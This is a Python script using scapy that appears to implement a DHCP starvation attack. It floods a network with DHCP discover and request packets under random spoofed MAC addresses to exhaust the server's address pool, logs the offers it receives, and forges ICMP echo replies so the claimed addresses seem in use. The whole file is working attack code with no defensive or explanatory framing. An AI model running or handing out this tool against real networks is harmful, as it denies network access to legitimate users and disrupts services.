import binascii
import getopt
import signal
import socket
import string
import struct
import sys
import threading
from sys import stdout

from scapy.all import *

MAC_LIST = []
TIMEOUT = {'dos': 8, 'dhcpip': 2, 'timer': 0.4}
REQUEST_OPTS = range(80)
conf.iface = "lo"
VERBOSITY = 3
THREAD_CNT = 1
THREAD_POOL = []
IFACE = 'enp0s3'


def randomMAC():
    global MAC_LIST
    if len(MAC_LIST) > 0:
        curr = MAC_LIST.pop()
        MAC_LIST = [curr] + MAC_LIST
        return curr
    mac = [0xDE, 0xAD,
           random.randint(0x00, 0x29),
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))


def unpackMAC(binmac):
    mac = binascii.hexlify(binmac)[0:12]
    blocks = [mac[x:x + 2] for x in range(0, len(mac), 2)]
    return ':'.join(v.decode("UTF-8") for v in blocks)


def signal_handler(signal, frame):
    i = 0
    for t in THREAD_POOL:
        t.kill_received = True
        i += 1
    sys.exit(0)


def sendPacket(pkt):
    sendp(pkt, iface=conf.iface)


class send_dhcp(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)
        self.kill_received = False

    def run(self):
        global TIMEOUT, dhcpdos, REQUEST_OPTS
        while not self.kill_received and not dhcpdos:
            m = randomMAC()

            dhcp_discover = Ether(src=get_if_hwaddr(IFACE), dst='ff:ff:ff:ff:ff:ff') / IP(src='0.0.0.0',
                                                                                             dst='255.255.255.255') / UDP(
                sport=68, dport=67) / BOOTP(chaddr=[mac2str(m)], xid=RandInt()) / DHCP(
                options=[('message-type', 'discover'), 'end'])
            sendp(dhcp_discover, iface=IFACE)
            if TIMEOUT['timer'] > 0:
                time.sleep(TIMEOUT['timer'])


class sniff_dhcp(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)

        self.filter = "arp or icmp or (udp and src port 67 and dst port 68)"
        self.kill_received = False
        self.dhcpcount = 0

    def run(self):
        global dhcpdos
        while not self.kill_received and not dhcpdos:
            sniff(filter=self.filter, prn=self.detect_dhcp, store=0, timeout=3, iface=IFACE)
            self.dhcpcount += 1

    def detect_dhcp(self, pkt):
        if DHCP in pkt:
            if pkt[DHCP] and pkt[DHCP].options[0][1] == 2:
                self.dhcpcount = 0
                for opt in pkt[DHCP].options:
                    if opt[0] == 'subnet_mask':
                        subnet = opt[1]
                        break
                myip = pkt[BOOTP].yiaddr
                sip = pkt[BOOTP].siaddr
                localxid = pkt[BOOTP].xid
                localm = unpackMAC(pkt[BOOTP].chaddr)
                myhostname = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
                f = open("request.txt", "a")
                f.write("type=<--" + " message= DHCP_Offer " + pkt[Ether].src + "\t" + sip + " + " +  myip + " IP: "+ myip + " for MAC=[" + localm + "]\n")
                f.close()
                dhcp_req = Ether(src=get_if_hwaddr(IFACE), dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0",
                                                                                            dst="255.255.255.255") / UDP(
                    sport=68, dport=67) / BOOTP(chaddr=[mac2str(localm)], xid=localxid) / DHCP(
                    options=[("message-type", "request"), ("server_id", sip), ("requested_addr", myip),
                             ("hostname", myhostname), "end"])
                sendp(dhcp_req, iface=IFACE)

        elif ICMP in pkt:
            if pkt[ICMP].type == 8:
                myip = pkt[IP].dst
                mydst = pkt[IP].src
                icmp_req = Ether(src=randomMAC(), dst=pkt.src) / IP(src=myip, dst=mydst) / ICMP(type=0, id=pkt[ICMP].id,
                                                                                                seq=pkt[
                                                                                                    ICMP].seq) / "12345678912345678912"
                sendp(icmp_req, iface=IFACE)


if __name__ == '__main__':

    global dhcpdos, dhcpsip, dhcpsmac, subnet, nodes, p_dhcp_advertise

    f = open("request.txt", "w")
    f.close()

    signal.signal(signal.SIGINT, signal_handler)
    dhcpsip = None
    dhcpsmac = None
    subnet = None
    nodes = {}
    dhcpdos = False
    p_dhcp_advertise = None

    t = sniff_dhcp()
    t.start()
    THREAD_POOL.append(t)

    for i in range(THREAD_CNT):
        t = send_dhcp()
        t.start()
        THREAD_POOL.append(t)

    fail_cnt = 40
    while dhcpsip is None and fail_cnt > 0:
        time.sleep(TIMEOUT['dhcpip'])
        fail_cnt -= 1

    if fail_cnt == 0:
        signal_handler(signal.SIGINT, fail_cnt)

    while not dhcpdos:
        time.sleep(TIMEOUT['dos'])
